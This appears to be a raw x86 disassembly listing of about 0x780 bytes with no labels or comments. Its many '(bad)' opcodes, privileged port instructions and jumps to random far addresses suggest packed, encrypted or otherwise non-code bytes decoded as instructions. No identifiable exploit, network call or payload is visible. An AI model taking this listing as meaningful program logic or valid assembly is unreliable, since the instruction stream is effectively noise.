  41a26d:	jmp    0x41a2b9
  41a26f:	pop    es
  41a270:	rcl    DWORD PTR [ebx-0x29],1
  41a273:	sub    cl,BYTE PTR [edx-0x24]
  41a276:	sub    BYTE PTR ds:0xb930c756,bh
  41a27c:	mov    dh,0xcc
  41a27e:	jae    0x41a23c
  41a280:	jle    0x41a244
  41a282:	push   es
  41a283:	inc    esi
  41a284:	enter  0x9f11,0x4f
  41a288:	cmp    al,0xd0
  41a28a:	int3   
  41a28b:	xchg   edi,eax
  41a28c:	sar    BYTE PTR [ecx],1
  41a28e:	adc    cl,dl
  41a290:	jmp    0xb44b:0x154de585
  41a297:	cmp    DWORD PTR [esi+0x29a9f2c2],eax
  41a29d:	add    BYTE PTR [esi+ebx*8],bh
  41a2a0:	(bad)  
  41a2a1:	xchg   edx,eax
  41a2a2:	(bad)  [ebp+0x40]
  41a2a5:	add    esp,DWORD PTR [edi]
  41a2a7:	push   cs
  41a2a8:	pop    ecx
  41a2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2aa:	test   esi,ecx
  41a2ac:	sub    bh,bh
  41a2ae:	js     0x41a25d
  41a2b0:	call   0x18718052
  41a2b5:	fisub  DWORD PTR [edx+eiz*8+0x274e17ed]
  41a2bc:	cmp    bh,BYTE PTR [ebx+0x9]
  41a2bf:	jecxz  0x41a2a4
  41a2c1:	in     eax,dx
  41a2c2:	inc    eax
  41a2c3:	cld    
  41a2c4:	jg     0x41a329
  41a2c6:	sub    DWORD PTR [ecx+ebp*2-0x1f],esp
  41a2ca:	pop    ecx
  41a2cb:	or     DWORD PTR [ebp-0x7cca13e3],eax
  41a2d1:	sbb    DWORD PTR ds:0xe8633cb2,0x2df3c17a
  41a2db:	popf   
  41a2dc:	and    al,0xef
  41a2de:	repnz icebp 
  41a2e0:	pop    edx
  41a2e1:	push   ebp
  41a2e2:	ja     0x41a35b
  41a2e4:	test   DWORD PTR [edi+eiz*1+0x76],edx
  41a2e8:	and    ecx,DWORD PTR [eax-0x462b6986]
  41a2ee:	call   0x308fb1a9
  41a2f3:	or     dh,BYTE PTR [ecx-0x6a]
  41a2f6:	hlt    
  41a2f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2f8:	shl    BYTE PTR [ecx+eiz*4+0x46fe9bd7],1
  41a2ff:	xor    al,0xa6
  41a301:	int    0xbb
  41a303:	mov    gs,ebx
  41a305:	repnz add al,0x8b
  41a308:	xchg   esp,eax
  41a309:	push   eax
  41a30a:	mov    al,fs:0xecdad874
  41a310:	xor    dl,BYTE PTR [esi+0x6efeadfd]
  41a316:	cdq    
  41a317:	les    eax,FWORD PTR [eax-0x68fdcc21]
  41a31d:	stc    
  41a31e:	ins    BYTE PTR es:[edi],dx
  41a31f:	imul   esi,DWORD PTR [ebx+0xd],0x91cd08c4
  41a326:	loop   0x41a37f
  41a328:	jns    0x41a2d3
  41a32a:	xchg   BYTE PTR [eax+0x37],ah
  41a32d:	enter  0xe583,0x83
  41a331:	mov    eax,0xde3ebc69
  41a336:	out    0x7,al
  41a338:	xchg   DWORD PTR [ecx+0xb],ebp
  41a33b:	fbstp  TBYTE PTR [edx]
  41a33d:	sbb    dh,BYTE PTR [edi-0x5f]
  41a340:	mov    al,0xe0
  41a342:	pusha  
  41a343:	push   ebx
  41a344:	mov    edx,0x8b52c257
  41a349:	dec    ecx
  41a34a:	sbb    DWORD PTR [esi+ebp*1-0x40],eax
  41a34e:	cs push esp
  41a350:	push   0x5440347b
  41a355:	repnz push ss
  41a357:	or     DWORD PTR [ebp+0x12317ecb],esp
  41a35d:	xchg   DWORD PTR [edi-0x22ac4c8a],edi
  41a363:	(bad)  
  41a364:	es push 0xa697c746
  41a36a:	stos   BYTE PTR es:[edi],al
  41a36b:	add    eax,0x667781f2
  41a370:	sub    ch,BYTE PTR [esi]
  41a372:	retf   
  41a373:	in     eax,0xf6
  41a375:	cmp    DWORD PTR [ecx-0xeb4fee4],ecx
  41a37b:	(bad)  
  41a37c:	xchg   esp,eax
  41a37d:	ins    DWORD PTR es:[edi],dx
  41a37e:	dec    ebx
  41a37f:	dec    ebx
  41a380:	add    edi,DWORD PTR [esi+0x1]
  41a383:	imul   esp,DWORD PTR [edi],0xffffffdd
  41a386:	xlat   BYTE PTR ds:[ebx]
  41a387:	test   cl,cl
  41a389:	stos   BYTE PTR es:[edi],al
  41a38a:	pop    edi
  41a38b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a38c:	mov    al,0x53
  41a38e:	dec    ecx
  41a38f:	sub    dl,BYTE PTR [edx]
  41a391:	pop    es
  41a392:	dec    esi
  41a393:	mov    ecx,0x6a34e6bf
  41a398:	sub    edx,DWORD PTR [eax+eax*2+0x5e]
  41a39c:	fnstsw WORD PTR [edx-0x2c94246]
  41a3a2:	mov    edx,0x196a6e8c
  41a3a7:	hlt    
  41a3a8:	ins    DWORD PTR es:[edi],dx
  41a3a9:	lods   al,BYTE PTR ds:[esi]
  41a3aa:	or     al,0xe6
  41a3ac:	stos   BYTE PTR es:[edi],al
  41a3ad:	mov    ebx,0x6c1079ab
  41a3b2:	mov    bh,0xc3
  41a3b4:	add    edx,eax
  41a3b6:	or     al,0x3c
  41a3b8:	sbb    al,0x5
  41a3ba:	dec    edi
  41a3bb:	xor    ch,BYTE PTR [ecx+0x16]
  41a3be:	mov    cl,dl
  41a3c0:	push   ss
  41a3c1:	in     eax,0x5f
  41a3c3:	pusha  
  41a3c4:	xchg   ebp,eax
  41a3c5:	daa    
  41a3c6:	xchg   esi,eax
  41a3c7:	fidivr DWORD PTR [esi]
  41a3c9:	dec    esp
  41a3ca:	lods   eax,DWORD PTR ds:[esi]
  41a3cb:	mul    esp
  41a3cd:	es inc edi
  41a3cf:	sbb    eax,0x8dcb2274
  41a3d4:	shl    BYTE PTR ds:0xbf1bd7fa,1
  41a3da:	and    BYTE PTR [ecx],bl
  41a3dc:	adc    dh,BYTE PTR [edx+0x7c]
  41a3df:	add    eax,0x40f67fc1
  41a3e4:	sub    ecx,0xbb20a6c8
  41a3ea:	and    eax,DWORD PTR [ebx+0x3501598d]
  41a3f0:	imul   ebx,DWORD PTR [ecx],0xe2bf80c1
  41a3f6:	pusha  
  41a3f7:	cmp    BYTE PTR [eax],dh
  41a3f9:	cdq    
  41a3fa:	retf   0x22eb
  41a3fd:	dec    ebx
  41a3fe:	(bad)  
  41a3ff:	sti    
  41a400:	sub    edx,DWORD PTR [ebx-0x76]
  41a403:	cmp    BYTE PTR [ecx],bl
  41a405:	dec    ebx
  41a406:	aas    
  41a407:	enter  0xb9d5,0x3e
  41a40b:	arpl   WORD PTR [esi+0x50],di
  41a40e:	cli    
  41a40f:	enter  0x6e35,0xff
  41a413:	push   gs
  41a415:	loope  0x41a401
  41a417:	lds    ebx,FWORD PTR [edx]
  41a419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41a:	sub    BYTE PTR [edi+ebx*2+0xc2fc64c],bl
  41a421:	add    edx,DWORD PTR [ebx]
  41a423:	icebp  
  41a424:	dec    edi
  41a425:	(bad)  
  41a426:	iret   
  41a427:	push   cs
  41a428:	(bad)  
  41a42a:	loop   0x41a3f6
  41a42c:	ret    
  41a42d:	(bad)  
  41a42e:	xlat   BYTE PTR ds:[ebx]
  41a42f:	call   0xcff7b4de
  41a434:	(bad)  
  41a436:	aad    0xf
  41a438:	loope  0x41a48a
  41a43a:	mov    al,0x96
  41a43c:	in     eax,dx
  41a43d:	xor    DWORD PTR [edi+0x1f],edi
  41a440:	pop    esp
  41a441:	xchg   esp,eax
  41a442:	mov    ch,0xd
  41a444:	mov    WORD PTR [ebp+0x6455bf89],gs
  41a44a:	add    eax,0x1f93b54b
  41a44f:	ret    0xc9f5
  41a452:	mov    edi,0x508640ed
  41a457:	fdivr  st,st(2)
  41a459:	pop    esp
  41a45a:	mov    ds:0xb6ae294a,al
  41a45f:	call   0x8e99e78e
  41a464:	push   cs
  41a465:	xchg   ebx,eax
  41a466:	push   ecx
  41a467:	int3   
  41a468:	jb     0x41a451
  41a46a:	(bad)  
  41a46b:	jecxz  0x41a469
  41a46d:	sahf   
  41a46e:	out    0xb0,eax
  41a470:	mov    edx,DWORD PTR [edx-0x502834e3]
  41a476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a477:	xor    BYTE PTR [eax],ch
  41a479:	lods   al,BYTE PTR ds:[esi]
  41a47a:	push   ebx
  41a47b:	xchg   edx,eax
  41a47c:	jno    0x41a4e4
  41a47e:	iret   
  41a47f:	mov    esp,esi
  41a481:	mov    ebx,0x962998fb
  41a486:	sbb    ebx,0xcbcd2205
  41a48c:	js     0x41a4c3
  41a48e:	push   ebp
  41a48f:	pusha  
  41a490:	jbe    0x41a426
  41a492:	and    edi,esp
  41a494:	push   ebp
  41a495:	xchg   edi,eax
  41a496:	push   0x80734f13
  41a49b:	dec    ebx
  41a49c:	hlt    
  41a49d:	fild   QWORD PTR ds:0x6d0b29d0
  41a4a3:	mov    ebx,0x6001c0c9
  41a4a8:	ins    DWORD PTR es:[edi],dx
  41a4a9:	fnstsw WORD PTR [ebx-0x307f5125]
  41a4af:	xor    edx,DWORD PTR [ebx*2+0x7fac2a26]
  41a4b6:	cmp    edi,DWORD PTR [edx+0x49]
  41a4b9:	clc    
  41a4ba:	xchg   ecx,eax
  41a4bb:	leave  
  41a4bc:	repz and eax,DWORD PTR [ebp-0x6eee64f5]
  41a4c3:	(bad)  
  41a4c5:	sbb    edi,DWORD PTR [esi+ebx*4]
  41a4c8:	add    esp,DWORD PTR [edx+ebx*1+0x452d8b6f]
  41a4cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4d0:	jno    0x41a527
  41a4d2:	adc    BYTE PTR [ebx-0x1b],al
  41a4d5:	into   
  41a4d6:	pop    edi
  41a4d7:	and    eax,0x6594ed78
  41a4dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4dd:	mov    ebp,0x5212929f
  41a4e2:	mov    al,ds:0x55bf1a30
  41a4e8:	push   cs
  41a4e9:	pop    edi
  41a4ea:	add    al,0xaa
  41a4ec:	dec    eax
  41a4ed:	fisubr DWORD PTR [eax-0x2ee156fa]
  41a4f3:	in     eax,0x6d
  41a4f5:	ror    BYTE PTR [edi-0x63a6d852],cl
  41a4fb:	fisubr DWORD PTR [ebp-0x16070516]
  41a501:	mov    ch,0x3f
  41a503:	retf   
  41a504:	sar    BYTE PTR [ecx+0x50],0x6d
  41a508:	xor    DWORD PTR [ebx-0x6c],esi
  41a50b:	or     al,0xc8
  41a50d:	xchg   ebp,eax
  41a50e:	in     al,dx
  41a50f:	mov    bh,0x7c
  41a511:	int3   
  41a512:	fidivr WORD PTR [ebx]
  41a514:	add    DWORD PTR [esi],edi
  41a516:	inc    edx
  41a517:	arpl   WORD PTR [edi-0x467d6f76],di
  41a51d:	and    eax,ebx
  41a51f:	adc    esp,edi
  41a521:	ds inc ecx
  41a523:	cmp    esp,ebx
  41a525:	jl     0x41a4de
  41a527:	and    eax,DWORD PTR [esi]
  41a529:	data16 xchg BYTE PTR [edi+0x1cecb5f9],bl
  41a530:	cmp    BYTE PTR [edi-0x7ae69da9],bh
  41a536:	ror    DWORD PTR [edi],cl
  41a538:	add    BYTE PTR [edx+0x2b51584b],dh
  41a53e:	outs   dx,BYTE PTR ds:[esi]
  41a53f:	and    al,0xfe
  41a541:	(bad)  
  41a542:	cmp    cl,BYTE PTR [ecx-0xffc12b]
  41a548:	retf   
  41a549:	outs   dx,BYTE PTR ds:[esi]
  41a54a:	xchg   esi,eax
  41a54b:	mov    ds,WORD PTR [eax-0x68b67716]
  41a551:	int3   
  41a552:	sub    ah,dl
  41a554:	pop    edi
  41a555:	add    al,0x2
  41a557:	arpl   WORD PTR [ebp+0x137024e1],sp
  41a55d:	test   eax,0x443da7c4
  41a562:	sub    dh,BYTE PTR [eax+0x55]
  41a565:	jb     0x41a4ee
  41a567:	pop    eax
  41a568:	loopne 0x41a546
  41a56a:	ins    DWORD PTR es:[edi],dx
  41a56b:	pop    es
  41a56c:	loopne 0x41a5c4
  41a56e:	mov    dh,0xc9
  41a570:	and    dh,BYTE PTR [ecx-0x27ed3c1]
  41a576:	rcl    ch,cl
  41a578:	cdq    
  41a579:	adc    BYTE PTR [edi],0x55
  41a57c:	dec    esi
  41a57d:	les    edi,FWORD PTR [edi+0x6]
  41a580:	inc    edi
  41a581:	mov    BYTE PTR [ecx-0x2e],al
  41a584:	sbb    eax,0xc1eebe4a
  41a589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a58a:	sub    DWORD PTR [eax+0x3d],esi
  41a58d:	push   esi
  41a58e:	push   es
  41a58f:	jle    0x41a57b
  41a591:	add    edx,DWORD PTR [eax-0x7]
  41a594:	test   DWORD PTR [edx-0x21ee840d],esi
  41a59a:	jmp    0x41a5a8
  41a59c:	data16 mov ch,0x4
  41a59f:	push   esp
  41a5a0:	add    bl,bl
  41a5a2:	mov    ebx,0x422e446a
  41a5a7:	test   edi,edi
  41a5a9:	sub    eax,0x9557fd64
  41a5ae:	add    DWORD PTR ds:0x69da2d3b,0xffffffd9
  41a5b5:	or     DWORD PTR [edx+esi*8+0x36],esi
  41a5b9:	clc    
  41a5ba:	std    
  41a5bb:	or     al,0x25
  41a5bd:	stos   DWORD PTR es:[edi],eax
  41a5be:	jns    0x41a564
  41a5c0:	add    ah,dh
  41a5c2:	push   ss
  41a5c3:	out    0x7d,eax
  41a5c5:	imul   eax,DWORD PTR [ecx+0x50],0x85bd425
  41a5cc:	call   DWORD PTR [ebx]
  41a5ce:	test   ch,0x39
  41a5d1:	xchg   ebx,eax
  41a5d2:	dec    esi
  41a5d3:	cmp    cl,BYTE PTR [esi-0x4b5e205e]
  41a5d9:	nop
  41a5da:	and    BYTE PTR [edx],ch
  41a5dc:	out    dx,al
  41a5dd:	jmp    0x41a5e8
  41a5df:	enter  0x6260,0xf
  41a5e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5e4:	adc    eax,0xbd410611
  41a5e9:	sub    edi,DWORD PTR [eax-0x76]
  41a5ec:	fs test eax,0x6c757fef
  41a5f2:	or     bl,cl
  41a5f4:	jmp    0x37d0:0xfaaf9efa
  41a5fb:	adc    BYTE PTR [ecx-0x310bca59],0x92
  41a602:	xchg   edx,eax
  41a603:	ins    DWORD PTR es:[edi],dx
  41a604:	and    eax,0x8b34c277
  41a609:	mov    WORD PTR [edx+eax*4-0x4e],ds
  41a60d:	jae    0x41a653
  41a60f:	mov    al,0x88
  41a611:	mov    bh,0x41
  41a613:	int3   
  41a614:	jns    0x41a68d
  41a616:	dec    esp
  41a617:	mov    eax,ds:0xfcce8408
  41a61c:	push   ecx
  41a61d:	test   DWORD PTR [esi],edx
  41a61f:	loope  0x41a693
  41a621:	sbb    eax,0xe7f95a1
  41a626:	cmp    DWORD PTR [edi+esi*1+0x3d],edi
  41a62a:	add    al,0x37
  41a62c:	js     0x41a691
  41a62e:	jmp    0x7a7a0926
  41a633:	and    esi,edx
  41a635:	xchg   ebx,eax
  41a636:	jno    0x41a637
  41a638:	leave  
  41a639:	adc    eax,0xa099c70b
  41a63e:	sub    esi,DWORD PTR [edi-0x6b]
  41a641:	and    cl,BYTE PTR [ecx-0x5a]
  41a644:	xor    BYTE PTR [edx-0x38df2761],0x35
  41a64b:	enter  0x42f9,0xc7
  41a64f:	fbld   TBYTE PTR [edi-0x30ecae8a]
  41a655:	fcomp  QWORD PTR [esi]
  41a657:	pmulhw mm6,QWORD PTR [edi+esi*4+0x4b8a88d1]
  41a65f:	sub    cl,dl
  41a661:	into   
  41a662:	mov    dh,BYTE PTR [esi-0x78]
  41a665:	mov    bl,BYTE PTR [edx-0x5f14cc0]
  41a66b:	dec    bh
  41a66d:	fld    TBYTE PTR [ecx+0x5b]
  41a670:	mov    esi,0xb1ee6a5b
  41a675:	jge    0x41a64e
  41a677:	jmp    0x41a684
  41a679:	sub    DWORD PTR [edx+ebp*2],edi
  41a67c:	dec    esp
  41a67d:	scas   eax,DWORD PTR es:[edi]
  41a67e:	add    DWORD PTR [esi],eax
  41a680:	out    0xcb,eax
  41a682:	xchg   esp,eax
  41a683:	jne    0x41a68c
  41a685:	iret   
  41a686:	enter  0x44a5,0x97
  41a68a:	ja     0x41a6a6
  41a68c:	sar    DWORD PTR [esi],1
  41a68e:	call   0x35ecc3c6
  41a693:	mov    edi,0x1f1c4774
  41a698:	jg     0x41a6b2
  41a69a:	xor    bl,BYTE PTR [ebx-0x46447a92]
  41a6a0:	xor    ah,cl
  41a6a2:	jg     0x41a6bc
  41a6a4:	shr    ecx,1
  41a6a6:	pop    esp
  41a6a7:	pusha  
  41a6a8:	cmp    eax,0xebc123d1
  41a6ad:	pop    eax
  41a6ae:	mov    ss,WORD PTR [edi]
  41a6b0:	shl    DWORD PTR [ecx-0x46],cl
  41a6b3:	dec    eax
  41a6b4:	push   edx
  41a6b5:	scas   al,BYTE PTR es:[edi]
  41a6b6:	pop    esi
  41a6b7:	hlt    
  41a6b8:	out    0xba,eax
  41a6ba:	aaa    
  41a6bb:	and    BYTE PTR [esi+0x5ddaf76b],ah
  41a6c1:	add    ah,bl
  41a6c3:	jo     0x41a718
  41a6c5:	dec    edi
  41a6c6:	scas   al,BYTE PTR es:[edi]
  41a6c7:	sbb    ch,BYTE PTR [ecx]
  41a6c9:	inc    esp
  41a6ca:	mov    esp,0xde696863
  41a6cf:	mov    eax,0xa55914a2
  41a6d4:	test   ah,ah
  41a6d6:	in     eax,0x61
  41a6d8:	loopne 0x41a6a3
  41a6da:	mov    bh,0x1d
  41a6dc:	cld    
  41a6dd:	add    eax,0x34c6bda3
  41a6e2:	mov    bh,0xe0
  41a6e4:	rcr    BYTE PTR [esi],1
  41a6e6:	push   ebp
  41a6e7:	and    dh,BYTE PTR [esi+0x6f146a8c]
  41a6ed:	in     al,0x3f
  41a6ef:	jbe    0x41a71e
  41a6f1:	jl     0x41a68e
  41a6f3:	arpl   WORD PTR [eax+0x566da2cd],si
  41a6f9:	push   edx
  41a6fa:	scas   eax,DWORD PTR es:[edi]
  41a6fb:	leave  
  41a6fc:	(bad)  
  41a6fe:	mov    edx,0xd68b4a17
  41a703:	pop    esp
  41a704:	(bad)
  41a708:	les    ecx,FWORD PTR [edi+0x1f]
  41a70b:	sbb    dh,dh
  41a70d:	iret   
  41a70e:	stos   DWORD PTR es:[edi],eax
  41a70f:	jl     0x41a6cd
  41a711:	mov    bl,0x4f
  41a713:	(bad)  
  41a714:	(bad)  
  41a715:	fcomp  DWORD PTR [esi+0x5c]
  41a718:	jp     0x41a794
  41a71a:	sbb    edx,DWORD PTR [esi-0x3fab5ab4]
  41a720:	mov    si,0xe5eb
  41a724:	fstp   TBYTE PTR ds:0x6b81fb31
  41a72a:	add    BYTE PTR [edi-0x21557b89],dh
  41a730:	push   ecx
  41a731:	imul   esi,DWORD PTR [edx+0xd3b6796],0x2bf87e29
  41a73b:	stos   BYTE PTR es:[edi],al
  41a73c:	sbb    bh,bl
  41a73e:	(bad)  
  41a73f:	push   ebx
  41a740:	pop    ebx
  41a741:	mov    dl,0x60
  41a743:	shl    DWORD PTR [edi-0x12],cl
  41a746:	(bad)  
  41a749:	(bad)
  41a74d:	inc    ebx
  41a74e:	neg    DWORD PTR [ecx+0x4df9680d]
  41a754:	je     0x41a74f
  41a756:	imul   esp,eax,0xffffff9b
  41a759:	or     BYTE PTR [ebx+ebx*4+0x59],cl
  41a75d:	imul   edi,DWORD PTR [edx],0x707f347
  41a763:	or     eax,0xb55052f9
  41a768:	mov    ecx,0x4288d4a2
  41a76d:	xchg   DWORD PTR [edx+0x32],edx
  41a770:	jle    0x41a781
  41a772:	inc    edx
  41a773:	dec    ecx
  41a774:	jmp    0xf9d4:0xfb3dfff4
  41a77b:	pop    esp
  41a77c:	into   
  41a77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a77e:	xor    ah,BYTE PTR [esi]
  41a780:	pop    ebx
  41a781:	jne    0x41a77e
  41a783:	dec    edx
  41a784:	ror    DWORD PTR [ebp-0x3a],1
  41a787:	dec    edi
  41a788:	lods   al,BYTE PTR ds:[esi]
  41a789:	adc    bh,al
  41a78b:	add    BYTE PTR [eax],0x7c
  41a78e:	cmp    al,0x96
  41a790:	test   eax,0xa5b4b160
  41a795:	or     dl,BYTE PTR ds:0xa160a3d6
  41a79b:	(bad)  
  41a79d:	xlat   BYTE PTR ds:[ebx]
  41a79e:	or     al,0x43
  41a7a0:	in     eax,dx
  41a7a1:	push   edx
  41a7a2:	fwait
  41a7a3:	mov    WORD PTR [ebx-0x53],cs
  41a7a6:	ja     0x41a732
  41a7a8:	out    0xd1,al
  41a7aa:	sub    eax,0x447b733a
  41a7af:	mov    ?,WORD PTR [esi-0x37372818]
  41a7b5:	test   BYTE PTR [esi+0x3a],al
  41a7b8:	adc    DWORD PTR [ebp+0x34],0x1c6901ec
  41a7bf:	daa    
  41a7c0:	mov    esp,0xbef2df0c
  41a7c5:	xor    al,0x2a
  41a7c7:	and    BYTE PTR ds:0x1fdbb173,ah
  41a7cd:	jle    0x41a799
  41a7cf:	sar    BYTE PTR [ebp+0x6d],1
  41a7d2:	or     cl,cl
  41a7d4:	push   ecx
  41a7d5:	data16 fisub DWORD PTR [ebx]
  41a7d8:	(bad)  
  41a7d9:	mov    ebx,0x45bba45a
  41a7de:	pop    eax
  41a7df:	mov    ss,WORD PTR [eax]
  41a7e1:	mov    ebx,0x781e6b60
  41a7e6:	mov    ebx,0x6f856541
  41a7eb:	hlt    
  41a7ec:	cs and al,0x41
  41a7ef:	xlat   BYTE PTR cs:[ebx]
  41a7f1:	int    0x1e
  41a7f3:	mov    al,0x9
  41a7f5:	out    0xf4,eax
  41a7f7:	imul   ebp,ebp,0x78
  41a7fa:	add    al,0xbc
  41a7fc:	or     edi,ebx
  41a7fe:	sbb    DWORD PTR [edx-0x392beb9f],0xa6f1e43b
  41a808:	retf   
  41a809:	arpl   WORD PTR [esi-0x18b2b8da],dx
  41a80f:	stc    
  41a810:	sbb    eax,0xf336000d
  41a815:	popa   
  41a816:	in     al,dx
  41a817:	xlat   BYTE PTR ds:[ebx]
  41a818:	scas   al,BYTE PTR es:[edi]
  41a819:	jns    0x41a7dd
  41a81b:	inc    eax
  41a81c:	iret   
  41a81d:	test   al,0x52
  41a81f:	mov    al,0x50
  41a821:	gs int 0xcb
  41a824:	mov    cs,WORD PTR [ebp+0x68c5c01c]
  41a82a:	sbb    DWORD PTR [ecx+ecx*2-0x48],edi
  41a82e:	dec    edx
  41a82f:	mov    dh,0xa9
  41a831:	or     ebp,DWORD PTR [esi]
  41a833:	mov    ebp,0xf26ca6c1
  41a838:	cmp    al,0x9d
  41a83a:	adc    al,0x17
  41a83c:	std    
  41a83d:	(bad)  
  41a83e:	pusha  
  41a83f:	inc    edx
  41a840:	in     al,dx
  41a841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a842:	bnd je 0x41a889
  41a845:	clc    
  41a846:	sub    eax,0x6b36ba65
  41a84b:	daa    
  41a84c:	xor    eax,0xabf7ba3
  41a851:	mov    dh,0x3a
  41a853:	and    eax,0x43c1fa92
  41a858:	daa    
  41a859:	aaa    
  41a85a:	jmp    0xe63d:0xbe242b76
  41a861:	xchg   edi,eax
  41a862:	jns    0x41a8bd
  41a864:	xchg   edx,eax
  41a865:	dec    esi
  41a866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a867:	mov    ds:0xd0584422,eax
  41a86c:	cmp    dl,BYTE PTR [ebp+0x4f6ef99e]
  41a872:	mov    cl,0xc4
  41a874:	out    dx,al
  41a875:	cmp    DWORD PTR [ecx*4+0x29903070],ecx
  41a87c:	ss xor eax,0xe0b93051
  41a882:	inc    ebx
  41a883:	mov    BYTE PTR ds:[ebx+0xfba083],ch
  41a88a:	pop    ebx
  41a88b:	mov    ds:0xa1c68197,eax
  41a890:	cmc    
  41a891:	xchg   ebp,eax
  41a892:	sbb    eax,0x1b335b42
  41a897:	xlat   BYTE PTR ds:[ebx]
  41a898:	(bad)  
  41a89a:	or     BYTE PTR [ebx+esi*8+0x374007b2],0x74
  41a8a2:	int3   
  41a8a3:	lods   eax,DWORD PTR ds:[esi]
  41a8a4:	mov    db4,ecx
  41a8a7:	jg     0x41a8ea
  41a8a9:	fwait
  41a8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8ab:	mov    ch,0xdb
  41a8ad:	out    0x28,al
  41a8af:	xchg   ecx,eax
  41a8b0:	fldenv [eax-0x66729bb3]
  41a8b6:	mov    eax,0x9f0aa8a
  41a8bb:	ss ja  0x41a93b
  41a8be:	mov    edi,0xeb6f4e78
  41a8c3:	out    dx,al
  41a8c4:	xor    eax,0x692d51b7
  41a8c9:	pop    ss
  41a8ca:	arpl   WORD PTR [edi+0x15abf24e],si
  41a8d0:	fld    QWORD PTR [eax]
  41a8d2:	inc    eax
  41a8d3:	test   eax,0x3ad0772d
  41a8d8:	jne    0x41a880
  41a8da:	lods   eax,DWORD PTR ds:[esi]
  41a8db:	dec    edi
  41a8dc:	xchg   edi,eax
  41a8dd:	shl    DWORD PTR [esi],0xb9
  41a8e0:	mov    esi,0x5f1e3aab
  41a8e6:	fst    DWORD PTR cs:[edi]
  41a8e9:	cmp    al,0x21
  41a8eb:	je     0x41a8ef
  41a8ed:	cld    
  41a8ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8ef:	adc    al,0x7b
  41a8f1:	push   0x65
  41a8f3:	or     bh,dh
  41a8f5:	xor    DWORD PTR [edi-0x69],eax
  41a8f8:	ins    DWORD PTR es:[edi],dx
  41a8f9:	scas   al,BYTE PTR es:[edi]
  41a8fa:	iret   
  41a8fb:	call   0x759e0310
  41a900:	(bad)  
  41a901:	jp     0x41a8e1
  41a903:	shl    BYTE PTR [edi],0x12
  41a906:	pop    ecx
  41a907:	in     al,0xf7
  41a909:	sbb    BYTE PTR [edi+0x371d968e],cl
  41a90f:	xchg   ebx,eax
  41a910:	adc    dh,BYTE PTR [eax-0x4]
  41a913:	in     eax,dx
  41a914:	loope  0x41a926
  41a916:	inc    edi
  41a917:	inc    edi
  41a918:	aad    0x15
  41a91a:	jmp    0x41a8fa
  41a91c:	xor    eax,0x7eacb859
  41a921:	inc    ebx
  41a922:	retf   0x7f22
  41a925:	inc    eax
  41a926:	jns    0x41a91b
  41a928:	std    
  41a929:	dec    ebx
  41a92a:	repz into 
  41a92c:	sub    esi,edi
  41a92e:	cld    
  41a92f:	and    DWORD PTR [edi-0x73],edi
  41a932:	jo     0x41a9ae
  41a934:	inc    eax
  41a935:	or     ah,BYTE PTR [edi]
  41a937:	mov    ebp,0x73a677f5
  41a93c:	and    BYTE PTR ds:0x9bcb70da,dh
  41a942:	sub    bl,BYTE PTR [edi]
  41a944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a945:	xchg   ecx,eax
  41a946:	cmp    al,0x99
  41a948:	dec    edi
  41a949:	dec    ebx
  41a94a:	cmc    
  41a94b:	push   eax
  41a94c:	shl    BYTE PTR [edi],1
  41a94e:	mov    esi,0x17e44c9a
  41a953:	outs   dx,BYTE PTR ds:[esi]
  41a954:	push   esp
  41a955:	pop    ds
  41a956:	inc    DWORD PTR ds:0x279e0977
  41a95c:	push   ecx
  41a95d:	jl     0x41a9ba
  41a95f:	jmp    0x41a963
  41a961:	and    eax,0xc3caa700
  41a966:	dec    edi
  41a967:	fwait
  41a968:	fs stc 
  41a96a:	stc    
  41a96b:	repz pushf 
  41a96d:	pop    ecx
  41a96e:	pop    edi
  41a96f:	pop    edx
  41a970:	mov    eax,ds:0xcd16182e
  41a975:	add    DWORD PTR [ecx],esi
  41a977:	and    al,0x0
  41a979:	inc    eax
  41a97a:	jae    0x41a92b
  41a97c:	jae    0x41a910
  41a97e:	fcomi  st,st(0)
  41a980:	mov    ecx,0x5229ec7d
  41a985:	jl     0x41a9db
  41a987:	iret   
  41a988:	int3   
  41a989:	mov    esi,0x892cfb9c
  41a98e:	clc    
  41a98f:	inc    edx
  41a990:	xor    BYTE PTR [edx],bl
  41a992:	push   edx
  41a993:	mov    ds:0x9d98ab88,eax
  41a998:	les    edx,FWORD PTR [ebp+0x51]
  41a99b:	test   eax,0xc99e149
  41a9a0:	outs   dx,BYTE PTR ds:[esi]
  41a9a1:	dec    ebx
  41a9a2:	int    0x5b
  41a9a4:	and    al,0x63
  41a9a6:	jl     0x41a9d9
  41a9a8:	(bad)  
  41a9a9:	mov    ch,0x85
  41a9ab:	or     BYTE PTR [ebp*4-0x64bfcaf4],bh
  41a9b2:	pop    edx
  41a9b3:	ficom  DWORD PTR [eax-0x65]
  41a9b6:	imul   ebp,DWORD PTR [ebx-0x3d],0xfffffff3
  41a9ba:	out    dx,eax
  41a9bb:	mov    ah,0x23
  41a9bd:	ss (bad) 
  41a9bf:	jns    0x41a9cd
  41a9c1:	pushf  
  41a9c2:	stos   DWORD PTR es:[edi],eax
  41a9c3:	mov    ecx,0x271b4a4
  41a9c8:	(bad)  
  41a9c9:	sbb    eax,0x335265d3
  41a9ce:	fsub   DWORD PTR [edi*1+0x4a560393]
  41a9d5:	or     al,BYTE PTR [esi]
  41a9d7:	out    dx,al
  41a9d8:	dec    ebp
  41a9d9:	or     eax,0x10f1d998
  41a9de:	add    bh,BYTE PTR [ecx]
  41a9e0:	add    BYTE PTR [ebx],bl
  41a9e2:	adc    esp,DWORD PTR [esi-0x39f5a742]
  41a9e8:	xchg   ebx,eax
  41a9e9:	mov    bh,0x1c
  41a9eb:	push   0x49e87a27
